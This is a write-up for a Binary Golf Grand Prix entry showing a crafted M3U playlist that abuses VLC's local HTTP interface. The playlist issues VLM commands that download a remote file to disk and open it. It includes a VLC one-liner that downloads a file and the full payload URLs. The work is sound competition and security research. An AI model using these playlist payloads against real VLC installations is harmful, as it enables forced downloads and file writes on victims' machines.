# BGGP5 - A M3U for VLC

aka SSRF'ing VLCs HTTP interface.

Should support Linux and MacOS, you may need to click off the playlist and
reclick it on macos to get VLC to show the updated playlist.
(something to do with the error this causes, I think).

## TL;DR

* `.m3u`s as VLC supports them can just be a list of URLs, which VLC will send
  requests to fetch. You don't need anything else like "#EXTM3U" as VLC doesn't
  care.
* When opened, `m3u`s will add their contents to the active playlist, with the
  filename being the name that shows up in the playlist if not otherwise
  overridden.
* VLC has an incredibly insecure http interface, which allows you to just send
  GET requests (with the requirement of HTTP auth) to access its commands.
* The interface lets you use VLM commands, which lets you script VLC to create
  streams.
* It is possible to use run a few VLM commands to download a file via HTTPS to
  disk, and also open this file as well.
* So if you download `https://binary.golf/5/5`, save it as a m3u and open it
  and the contents will be displayed right in the playlist!

![In Action](https://github.com/bahorn/BGGP5-m3u-vlc/blob/master/img/pic.png?raw=true)

## Write up

### From just the command line

To start off, here is a LOLbin usage of VLC to download a file:
```
vlc https://binary.golf/5/5 :demux=dump :demuxdump-file=out.vlc out.vlc
```

(l33t 0d4y, not listed in GTFO bins!)

A few things to note:
* VLC supports accessing HTTP(S) URLs.
* You can use the dump demux [1], that will just write a file with no changes,
  avoiding all media parsing.
* out.vlc will be used as a playlist (.vlc is just an alias for .m3u) and will
  resolve the filename.

### HTTP Interface

#### Enabling

We have to run VLC with some extra flags to enable the http server:
```
vlc -I qt --extraintf http --http-password 5 --http-port 8080 payload.m3u8
```

* Setting the default interface to QT (or macosx on macos)
* Enable the HTTP server, set a password (a requirement) and the port.

We need to set the port as I hit different port numbers on macos and linux.

#### What can we do

Looking at [2], we can see two interesting endpoints:
* `status.xml`
* `vlm_cmd.xml`

With `status.xml`, we can play directly play a file from disk, which will come
in handy.

`vlm_cmd.xml` gives us the ability to run VLM commands, which has a lot of
power.

Both are used by passing the query `?command=blah` where blah is the command you
want to run.
Entirely via GET requests!

### VLM to write to disk

VLM[3] gives you a set of commands to setup streams / otherwise control VLC.

After some experimenting, I found the following VLM commands to write a file
downloaded over HTTP to disk:

```
new c vod enabled input https://binary.golf/5/5 option demux=dump option demuxdump-file=.m3u
control c play
```

I did experiment with using stream outputs, but I realised I could just use
`demux=dump` here to write it out.

### Bringing everything together

So, we can then run our vlm commands by putting the following in the file:
```
http://:5@0:8080/requests/vlm_cmd.xml?command=new c vod enabled input https://binary.golf/5/5 option demux%3ddump option demuxdump-file%3d.m3u
http://:5@0:8080/requests/vlm_cmd.xml?command=control c play
```

`https://:5@0:8080/` does HTTP auth with the password 5, and 0 is an alias for
localhost we can use.
We get to pass our command easily, just needing to manually urlencode `=`.

Finally, we can open the BGGP5 file we saved to disk as a m3u, and it'll
display:
```
http://:5@0:8080/requests/status.xml?command=in_play&input=.m3u
```

You can also save further space by binding VLC to port 80, saving 15 bytes.

### Further Optimizations

Turns out the final request is not needed, see `optimization.m3u8`.

Also, appending `?.m3u` can be used to make random links get interpreted as
`m3u`s, optimizing it down to 28 bytes (but thats boring!). See `lame.m3u8` for
that.

## References

* [1] https://wiki.videolan.org/Demuxdump/
* [2] https://wiki.videolan.org/VLC_HTTP_requests/
* [3] https://github.com/videolan/vlc/blob/master/doc/vlm.txt
